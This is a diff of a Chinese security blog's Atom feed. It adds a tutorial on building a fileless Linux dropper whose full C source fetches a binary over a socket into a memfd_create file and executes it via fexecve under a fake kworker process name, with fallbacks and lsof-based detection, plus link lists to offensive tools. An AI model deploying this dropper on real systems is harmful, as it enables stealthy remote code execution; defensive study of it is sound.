@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2018-02-09T03:06:30.000Z</updated>
+  <updated>2018-02-20T03:52:20.000Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -16,11 +16,129 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>linux一种无文件后门技巧</title>
+    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
+    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/</id>
+    <published>2018-02-20T03:51:50.000Z</published>
+    <updated>2018-02-20T03:52:20.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TD-DR"><a href="#TD-DR" class="headerlink" title="TD;DR"></a>TD;DR</h4><ul>
+<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
+</li>
+<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
+</li>
+<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），就是说我们这篇文章的目的只是教学性的，因为最终恶意软件分析专家需要去了解恶意软件开发者是怎么利用的，让我们能更好的去检测它，从而使我们的系统更加安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
+<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
+<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此你不能简单的通过ls命令进行查看。</li>
+<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
+<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
+<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
+<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存取在磁盘上。</li>
+<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
+<ul>
+<li><p>让我们先来看一下这个代码吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
+<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
+<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
+<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
+<li>我们使用了libc的syscall去对memfd_create进行了封装。</li>
+<li>这个程序主要做了下面的事情</li>
+<li>1.创建了一个TCP socket</li>
+<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
+</li>
+<li><p>3.创建一个内存文件</p>
+</li>
+<li>4.从socket读取数据写入到内存文件</li>
+<li>5.一旦文件传输完毕，运行内存文件</li>
+<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
+<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
+<li><p>在控制台我们运行下面的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
+</li>
+<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是eyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧/xeye.png" alt=""></p>
+<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
+<li><p>查找这个进程是比较困难的，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个什么so的进程名来让它看起来像是个内核的进程，让我们来看一下ps的输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
+<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
+<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当猥琐的。</li>
+<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧/lsof.png" alt=""></li>
+<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
+<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
+<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
+<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
+<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>然而，主要注意的是，这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
+<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
+<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
+</li>
+<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
+<li>读完这篇文章，你应该了解了我们之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
+<li>这篇文章中作者给出的是xeye，其实还有更好其它的利用场景…<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TD-DR&quot;&gt;&lt;a href=&quot;#TD-DR&quot; class=&quot;headerlink&quot; title=&quot;TD;DR&quot;&gt;&lt;/a&gt;TD;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;几周之前我看了这篇&lt;a href=&quot;https://blog.gdssecurity.com/la
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>20180214安全动态</title>
+    <link href="http://kevien.github.io/2018/02/14/20180214%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
+    <id>http://kevien.github.io/2018/02/14/20180214安全动态/</id>
+    <published>2018-02-14T04:21:49.000Z</published>
+    <updated>2018-02-14T08:52:09.823Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>Docker 微服务教程<br><a href="http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html</a></li>
+<li>渗透技巧——Windows下的剪贴板<br><a href="http://www.4hou.com/technology/10253.html" target="_blank" rel="external">http://www.4hou.com/technology/10253.html</a></li>
+<li>HTA encryption tool for RedTeams<br><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/" target="_blank" rel="external">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/</a></li>
+<li>Stealing SSH credentials via a Python PAM module<br><a href="https://github.com/mthbernardes/sshLooter" target="_blank" rel="external">https://github.com/mthbernardes/sshLooter</a></li>
+<li>关于浏览器安全的会议ppt<br><a href="https://www.kanxue.com/book-9-208.htm" target="_blank" rel="external">https://www.kanxue.com/book-9-208.htm</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Docker 微服务教程&lt;br&gt;&lt;a href=&quot;http://www.ruanyifeng.c
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>20180206安全动态</title>
     <link href="http://kevien.github.io/2018/02/06/20180206%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
     <id>http://kevien.github.io/2018/02/06/20180206安全动态/</id>
     <published>2018-02-05T16:01:38.000Z</published>
-    <updated>2018-02-09T03:06:30.000Z</updated>
+    <updated>2018-02-09T16:04:49.089Z</updated>
     
     <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
 <li>APTSimulator - 一个批处理脚本，快速将 Windows 系统改造成被 APT 入侵过的环境，用于安全产品测试等需求<br><a href="https://github.com/Neo23x0/APTSimulator" target="_blank" rel="external">https://github.com/Neo23x0/APTSimulator</a></li>
@@ -29,6 +147,7 @@
 <li>IDA Pro 的官方推出了 7.0 的免费版本，支持 Windows、macOS、Linux 三个平台<br><a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml" target="_blank" rel="external">https://www.hex-rays.com/products/ida/support/download_freeware.shtml</a></li>
 <li>ToolAnalysisResultSheet - 日本 CERT（jpcert）总结的 49 个常用工具（PsExec、wmic、schtasks、PWDump7 等）在执行后会留下的系统痕迹，这些记录可以被用于判断机器是否被入侵过<br><a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" target="_blank" rel="external">https://jpcertcc.github.io/ToolAnalysisResultSheet/</a></li>
 <li>在 XML 中使用两种编码以绕过 WAF 检测<br><a href="https://mohemiv.com/all/evil-xml/" target="_blank" rel="external">https://mohemiv.com/all/evil-xml/</a></li>
+<li>二进制漏洞利用开发教程<br><a href="https://0x00sec.org/t/getting-cozy-with-exploit-development/5311" target="_blank" rel="external">https://0x00sec.org/t/getting-cozy-with-exploit-development/5311</a></li>
 </ul>
 ]]></content>
     
@@ -737,7 +856,7 @@
     <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
 <li>rootkit - 针对 Ubuntu 16.04 和 10.04 的 rootkit<br><a href="https://github.com/nurupo/rootkit" target="_blank" rel="external">https://github.com/nurupo/rootkit</a></li>
 <li>从 PE 文件结构角度出发，如何手动植入后门<br><a href="http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html" target="_blank" rel="external">http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html</a></li>
-<li>osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架<br><a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#104;&#x74;&#116;&#112;&#115;&#x3a;&#x2f;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#47;&#x40;&#112;&#97;&#108;&#97;&#110;&#x74;&#x69;&#114;&#47;&#x6f;&#x73;&#113;&#117;&#x65;&#x72;&#x79;&#45;&#x61;&#x63;&#x72;&#x6f;&#115;&#115;&#x2d;&#x74;&#x68;&#x65;&#x2d;&#101;&#110;&#116;&#x65;&#114;&#x70;&#x72;&#105;&#x73;&#x65;&#x2d;&#51;&#x63;&#x33;&#99;&#57;&#x64;&#x31;&#x33;&#101;&#x63;&#x35;&#53;">&#104;&#x74;&#116;&#112;&#115;&#x3a;&#x2f;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#47;&#x40;&#112;&#97;&#108;&#97;&#110;&#x74;&#x69;&#114;&#47;&#x6f;&#x73;&#113;&#117;&#x65;&#x72;&#x79;&#45;&#x61;&#x63;&#x72;&#x6f;&#115;&#115;&#x2d;&#x74;&#x68;&#x65;&#x2d;&#101;&#110;&#116;&#x65;&#114;&#x70;&#x72;&#105;&#x73;&#x65;&#x2d;&#51;&#x63;&#x33;&#99;&#57;&#x64;&#x31;&#x33;&#101;&#x63;&#x35;&#53;</a></li>
+<li>osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架<br><a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x68;&#116;&#116;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x40;&#112;&#97;&#x6c;&#97;&#x6e;&#116;&#105;&#114;&#47;&#111;&#x73;&#113;&#x75;&#x65;&#x72;&#121;&#45;&#x61;&#99;&#114;&#111;&#x73;&#x73;&#x2d;&#116;&#x68;&#101;&#45;&#x65;&#x6e;&#x74;&#101;&#x72;&#112;&#x72;&#105;&#x73;&#x65;&#45;&#x33;&#99;&#51;&#x63;&#57;&#x64;&#x31;&#51;&#101;&#99;&#53;&#53;">&#x68;&#116;&#116;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x40;&#112;&#97;&#x6c;&#97;&#x6e;&#116;&#105;&#114;&#47;&#111;&#x73;&#113;&#x75;&#x65;&#x72;&#121;&#45;&#x61;&#99;&#114;&#111;&#x73;&#x73;&#x2d;&#116;&#x68;&#101;&#45;&#x65;&#x6e;&#x74;&#101;&#x72;&#112;&#x72;&#105;&#x73;&#x65;&#45;&#x33;&#99;&#51;&#x63;&#57;&#x64;&#x31;&#51;&#101;&#99;&#53;&#53;</a></li>
 <li>使用 Windows Defender ATP 检查反射型 DLL 加载<br><a href="https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc" target="_blank" rel="external">https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc</a></li>
 <li>Windows 系统中的安全软件的 Bypass 策略。从特征检测、行为检测、信誉评估检测三个方向讨论对应的 Bypass 方法<br><a href="https://artofpwn.com/spookflare.html" target="_blank" rel="external">https://artofpwn.com/spookflare.html</a></li>
 <li>PowerKrabsEtw - 用于实时 ETW(事件日志) Trace 的 PowerShell 模块，基于微软的 krabsetw 库实现<br><a href="https://github.com/zacbrown/PowerKrabsEtw" target="_blank" rel="external">https://github.com/zacbrown/PowerKrabsEtw</a></li>
@@ -807,7 +926,7 @@
 <li>当第三方组件变成邪恶之源<br><a href="https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y" target="_blank" rel="external">https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y</a></li>
 <li>glibc malloc学习笔记之fastbin<br><a href="https://paper.seebug.org/445/" target="_blank" rel="external">https://paper.seebug.org/445/</a></li>
 <li>Hyper-V安全从0到1<br><a href="https://bbs.pediy.com/thread-222626.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222626.htm</a></li>
-<li><p>Drexel One API逆向工程<br><a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x68;&#x74;&#x74;&#112;&#x73;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#x64;&#105;&#117;&#109;&#x2e;&#99;&#111;&#109;&#47;&#64;&#116;&#111;&#x6d;&#x65;&#114;&#115;&#104;&#x65;&#x6d;&#101;&#x73;&#x68;&#47;&#x72;&#x65;&#118;&#x65;&#x72;&#115;&#101;&#x2d;&#101;&#x6e;&#103;&#105;&#x6e;&#101;&#101;&#114;&#x69;&#x6e;&#x67;&#x2d;&#x74;&#104;&#101;&#45;&#x64;&#114;&#101;&#x78;&#101;&#108;&#45;&#111;&#x6e;&#x65;&#45;&#97;&#112;&#x69;&#45;&#x33;&#55;&#x30;&#97;&#53;&#x36;&#x30;&#x61;&#102;&#101;&#x64;&#x66;">&#x68;&#x74;&#x74;&#112;&#x73;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#x64;&#105;&#117;&#109;&#x2e;&#99;&#111;&#109;&#47;&#64;&#116;&#111;&#x6d;&#x65;&#114;&#115;&#104;&#x65;&#x6d;&#101;&#x73;&#x68;&#47;&#x72;&#x65;&#118;&#x65;&#x72;&#115;&#101;&#x2d;&#101;&#x6e;&#103;&#105;&#x6e;&#101;&#101;&#114;&#x69;&#x6e;&#x67;&#x2d;&#x74;&#104;&#101;&#45;&#x64;&#114;&#101;&#x78;&#101;&#108;&#45;&#111;&#x6e;&#x65;&#45;&#97;&#112;&#x69;&#45;&#x33;&#55;&#x30;&#97;&#53;&#x36;&#x30;&#x61;&#102;&#101;&#x64;&#x66;</a></p>
+<li><p>Drexel One API逆向工程<br><a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x68;&#116;&#116;&#112;&#x73;&#x3a;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#116;&#111;&#109;&#x65;&#114;&#115;&#x68;&#x65;&#109;&#101;&#115;&#104;&#x2f;&#x72;&#101;&#118;&#101;&#x72;&#115;&#x65;&#x2d;&#101;&#x6e;&#103;&#x69;&#x6e;&#101;&#101;&#114;&#105;&#110;&#x67;&#45;&#116;&#104;&#x65;&#x2d;&#x64;&#114;&#x65;&#x78;&#x65;&#108;&#x2d;&#111;&#110;&#101;&#45;&#97;&#112;&#105;&#45;&#51;&#55;&#x30;&#x61;&#53;&#x36;&#48;&#x61;&#x66;&#x65;&#100;&#x66;">&#x68;&#116;&#116;&#112;&#x73;&#x3a;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#116;&#111;&#109;&#x65;&#114;&#115;&#x68;&#x65;&#109;&#101;&#115;&#104;&#x2f;&#x72;&#101;&#118;&#101;&#x72;&#115;&#x65;&#x2d;&#101;&#x6e;&#103;&#x69;&#x6e;&#101;&#101;&#114;&#105;&#110;&#x67;&#45;&#116;&#104;&#x65;&#x2d;&#x64;&#114;&#x65;&#x78;&#x65;&#108;&#x2d;&#111;&#110;&#101;&#45;&#97;&#112;&#105;&#45;&#51;&#55;&#x30;&#x61;&#53;&#x36;&#48;&#x61;&#x66;&#x65;&#100;&#x66;</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mac上的逆向</div></pre></td></tr></table></figure>
 </li>
 <li><p>信息安全Cheat Sheets<br><a href="https://www.cybrary.it/0p3n/infosec-cheat-sheets/" target="_blank" rel="external">https://www.cybrary.it/0p3n/infosec-cheat-sheets/</a></p>
@@ -815,7 +934,7 @@
 <li>新近出现的提权框架<br><a href="https://github.com/spencerdodd/kernelpop" target="_blank" rel="external">https://github.com/spencerdodd/kernelpop</a></li>
 <li>Windows利用开发四：SEH覆写<br><a href="http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html" target="_blank" rel="external">http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html</a></li>
 <li>DCOM与DDE的奇妙结合<br><a href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom" target="_blank" rel="external">https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom</a></li>
-<li>二进制代码的模糊测试<br><a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#x40;&#110;&#106;&#118;&#x6f;&#x73;&#x73;&#x32;&#x39;&#x39;&#x2f;&#x61;&#102;&#x6c;&#45;&#117;&#110;&#x69;&#x63;&#111;&#x72;&#x6e;&#x2d;&#102;&#x75;&#x7a;&#x7a;&#x69;&#110;&#103;&#45;&#97;&#x72;&#x62;&#105;&#x74;&#114;&#x61;&#114;&#121;&#x2d;&#x62;&#x69;&#x6e;&#x61;&#114;&#x79;&#x2d;&#99;&#x6f;&#100;&#101;&#x2d;&#x35;&#x36;&#51;&#99;&#97;&#50;&#x38;&#57;&#x33;&#54;&#x62;&#x66;">&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#x40;&#110;&#106;&#118;&#x6f;&#x73;&#x73;&#x32;&#x39;&#x39;&#x2f;&#x61;&#102;&#x6c;&#45;&#117;&#110;&#x69;&#x63;&#111;&#x72;&#x6e;&#x2d;&#102;&#x75;&#x7a;&#x7a;&#x69;&#110;&#103;&#45;&#97;&#x72;&#x62;&#105;&#x74;&#114;&#x61;&#114;&#121;&#x2d;&#x62;&#x69;&#x6e;&#x61;&#114;&#x79;&#x2d;&#99;&#x6f;&#100;&#101;&#x2d;&#x35;&#x36;&#51;&#99;&#